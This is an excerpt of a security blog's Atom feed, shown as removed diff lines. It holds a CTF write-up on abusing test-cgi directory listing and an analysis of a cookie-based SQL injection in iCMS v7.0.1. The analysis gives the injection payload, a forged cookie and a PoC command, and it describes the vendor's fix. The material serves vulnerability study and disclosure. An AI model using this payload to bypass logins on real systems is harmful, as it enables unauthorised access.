-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SEC-T CTF2017-Sprinkler system-writeup</title>
-    <link href="http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/"/>
-    <id>http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/</id>
-    <published>2017-09-14T01:19:09.000Z</published>
-    <updated>2017-09-17T10:44:00.456Z</updated>
-    
-    <content type="html"><![CDATA[<p>SEC-T CTF2017-Sprinkler system-writeup<br>test-cgi利用<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Solves: 102</div><div class="line"></div><div class="line">Service: http://sprinklers.alieni.se/</div><div class="line"></div><div class="line">Author: avlidienbrunn</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>发现有robots.txr。访问：<a href="http://sprinklers.alieni.se/robots.txt" target="_blank" rel="external">http://sprinklers.alieni.se/robots.txt</a></p>
-<p>接着访问 <a href="http://sprinklers.alieni.se/cgi-bin/test-cgi" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/3.png?raw=true" alt=""></p>
-<p>是 test-cgi ， 可以遍历目录。访问 <a href="http://sprinklers.alieni.se/cgi-bin/test-cgi?*" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi?*</a></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/2.png?raw=true" alt=""></p>
-<p>最后访问：<a href="http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system</a></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SECT&#123;-p00l_On_t3h_r00f_must_h@v3_A_l3ak!-&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;SEC-T CTF2017-Sprinkler system-writeup&lt;br&gt;test-cgi利用&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ICMSv7.0.1 admincp.class.php sql注入分析</title>
-    <link href="http://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql注入分析/</id>
-    <published>2017-09-12T06:19:23.000Z</published>
-    <updated>2017-09-12T10:26:33.999Z</updated>
-    
-    <content type="html"><![CDATA[<p>ICMSv7.0.1 admincp.class.php sql注入分析<br>代码审计学习中<br><a id="more"></a><br>下载地址：<a href="https://github.com/idreamsoft/iCMS/releases/tag/v7.0.1" target="_blank" rel="external">ICMSv7.0.1</a></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>出现漏洞的地方在 app\admincp\admincp.class.php 的init函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">self</span>::check_seccode(); <span class="comment">//验证码验证</span></div><div class="line"></div><div class="line">		iUI::$dialog[<span class="string">'title'</span>] = iPHP_APP;</div><div class="line">		iDB::$show_errors     = <span class="keyword">true</span>;</div><div class="line">		iDB::$show_trace      = <span class="keyword">false</span>;</div><div class="line">		iDB::$show_explain    = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">		members::$LOGIN_PAGE  = ACP_PATH.<span class="string">'/template/admincp.login.php'</span>;</div><div class="line">		members::$GATEWAY     = iPHP::PG(<span class="string">'gateway'</span>);</div><div class="line">		members::check_login(); <span class="comment">//用户登陆验证</span></div><div class="line">		members::check_priv(<span class="string">'ADMINCP'</span>,<span class="string">'page'</span>);<span class="comment">//检查是否有后台权限</span></div><div class="line"></div><div class="line">		files::init(<span class="keyword">array</span>(<span class="string">'userid'</span>=&gt; members::$userid));</div><div class="line">		<span class="comment">//菜单</span></div><div class="line">		menu::init();</div><div class="line">		menu::$callback = <span class="keyword">array</span>(</div><div class="line">			<span class="string">"priv"</span> =&gt; <span class="keyword">array</span>(<span class="string">"members"</span>,<span class="string">"check_priv"</span>),</div><div class="line">			<span class="string">"hkey"</span> =&gt; members::$userid</div><div class="line">        );</div><div class="line"></div><div class="line">        admincp::$callback = <span class="keyword">array</span>(</div><div class="line">			<span class="string">"history"</span> =&gt; <span class="keyword">array</span>(<span class="string">"menu"</span>,<span class="string">"history"</span>),</div><div class="line">			<span class="string">"priv"</span>    =&gt; <span class="keyword">array</span>(<span class="string">"members"</span>,<span class="string">"check_priv"</span>)</div><div class="line">        );</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<p>在用户登陆验证，调用members::check_login()，跟进，其代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="comment">//        self::$LOGIN_COUNT = (int)authcode(get_cookie('iCMS_LOGIN_COUNT'),'DECODE');</span></div><div class="line"><span class="comment">//        if(self::$LOGIN_COUNT&gt;iCMS_LOGIN_COUNT) exit();</span></div><div class="line"></div><div class="line">	 $a   = iSecurity::escapeStr($_POST[<span class="string">'username'</span>]);</div><div class="line">	 $p   = iSecurity::escapeStr($_POST[<span class="string">'password'</span>]);</div><div class="line">	 $ip  = iPHP::get_ip();</div><div class="line">	 $sep = iPHP_AUTH_IP?<span class="string">'#=iCMS['</span>.$ip.<span class="string">']=#'</span>:<span class="string">'#=iCMS=#'</span>;</div><div class="line">	 <span class="keyword">if</span>(<span class="keyword">empty</span>($a) &amp;&amp; <span class="keyword">empty</span>($p)) &#123;</div><div class="line">		 $auth       = iPHP::get_cookie(<span class="keyword">self</span>::$AUTH);</div><div class="line">		 <span class="keyword">list</span>($a,$p) = explode($sep,authcode($auth,<span class="string">'DECODE'</span>));</div><div class="line">		 $c = <span class="keyword">self</span>::check($a,$p);</div><div class="line">	 &#125;<span class="keyword">else</span> &#123;</div><div class="line">		 $p = md5($p);</div><div class="line">		 $c = <span class="keyword">self</span>::check($a,$p);</div><div class="line">		 <span class="keyword">if</span> ($c)&#123;</div><div class="line">			 iDB::query(<span class="string">"</span></div><div class="line">				 UPDATE `#iCMS@__members`</div><div class="line">				 SET `lastip`='".$ip.<span class="string">"',</span></div><div class="line">				 `lastlogintime`='".time().<span class="string">"',</span></div><div class="line">				 `logintimes`=logintimes+1</div><div class="line">				 WHERE `uid`='".<span class="keyword">self</span>::$userid.<span class="string">"'</span></div><div class="line">			 ");</div><div class="line">			 iPHP::set_cookie(<span class="keyword">self</span>::$AUTH,authcode($a.$sep.$p,<span class="string">'ENCODE'</span>));</div><div class="line">		 &#125;</div><div class="line">	 &#125;</div><div class="line">	 <span class="keyword">return</span> <span class="keyword">self</span>::result($c);</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
-<p><code>$a</code>和<code>$p</code>分别是用户名和密码，会先经过escapeStr的过滤，若不为空且通过了self::check($a,$p)的检查即可登陆成功。若为空，则会从cookie里获取值，并通过<code>list($a,$p) = explode($sep,authcode($auth,&#39;DECODE&#39;));</code>获取到用户名和密码，并进行检查self::check($a,$p)。</p>
-<p>self::check()的部分代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($a,$p)</span> </span>&#123;</div><div class="line">	 <span class="keyword">if</span>(<span class="keyword">empty</span>($a) &amp;&amp; <span class="keyword">empty</span>($p)) &#123;</div><div class="line">		 <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	 &#125;</div><div class="line"></div><div class="line">	 <span class="keyword">self</span>::$data = iDB::row(<span class="string">"SELECT * FROM `#iCMS@__members` WHERE `username`='&#123;$a&#125;' AND `password`='&#123;$p&#125;' AND `status`='1' LIMIT 1;"</span>);</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>通常情况下，要从登陆口进行注入，传入的参数会进行escapeStr()的过滤，而escapeStr()是比较严格的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">escapeStr</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span>(is_array($string)) &#123;</div><div class="line">		<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</div><div class="line">			$string[$key] = iSecurity::escapeStr($val);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$string = str_replace(<span class="keyword">array</span>(<span class="string">'%00'</span>,<span class="string">'\\0'</span>,<span class="string">"\0"</span>,<span class="string">"\x0B"</span>), <span class="string">''</span>, $string); <span class="comment">//modified@2010-7-5</span></div><div class="line">		$string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>,<span class="string">"'"</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>,<span class="string">'&amp;#039;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>), $string);</div><div class="line">		$string = preg_replace(<span class="string">'/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;)|[a-zA-Z][a-z0-9]&#123;2,5&#125;);)/'</span>, <span class="string">'&amp;\\1'</span>,$string);</div><div class="line">		$string = str_replace(<span class="string">'\\\\'</span>, <span class="string">'&amp;#92;'</span>, $string);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>对单双引号都做了过滤，因此若是直接注入，会闭合失败。</p>
-<p>考虑从cookie获取参数的路径，即下面这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($a) &amp;&amp; <span class="keyword">empty</span>($p)) &#123;</div><div class="line">	$auth       = iPHP::get_cookie(<span class="keyword">self</span>::$AUTH);</div><div class="line">	<span class="keyword">list</span>($a,$p) = explode($sep,authcode($auth,<span class="string">'DECODE'</span>));</div><div class="line">	$c = <span class="keyword">self</span>::check($a,$p);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>从cookie中恢复的<code>$a</code>和<code>$p</code>没有再进行检查。所以假设我们能构造一个cookie，使得从explode恢复出来的<code>$a</code>和<code>$p</code>包含引号能够闭合，那就能引发sql注入了。</p>
-<p>假设username为<code>&#39; or 1=1%23</code>，password为随意，则期望的sql注入语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM `#iCMS@__members` WHERE `username`=&apos;&apos; or 1=1#&apos; AND `password`=&apos;1&apos; AND `status`=&apos;1&apos; LIMIT</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/3.png?raw=true" alt=""></p>
-<p>生成的对应的cookie即为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">4a62f154%2B9j%2BoQdL3%2BsaUTFDkMvY6WSLPzfJIFgd%2FBLE1ghVDuX4WQjoLW7es0tR60E</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/4.png?raw=true" alt=""></p>
-<p>可以看到已经登陆成功。</p>
-<p><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a>里提供了python版本的poc，对应命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -t icms -s v701_sqlinject_getadmin -u http://10.10.10.1:2500/iCMS-7.0.1/admincp.php</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/6.png?raw=true" alt=""></p>
-<h1 id="修补方案"><a href="#修补方案" class="headerlink" title="修补方案"></a>修补方案</h1><p>官方在 <a href="https://github.com/idreamsoft/iCMS/releases/tag/v7.0.2" target="_blank" rel="external">v7.0.2</a>中修复了该漏洞，在members::check_login()函数中，当从cookie中获取到$a,$p后先进行了一次addslashes，之后才进行查询。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/5.png?raw=true" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;ICMSv7.0.1 admincp.class.php sql注入分析&lt;br&gt;代码审计学习中&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
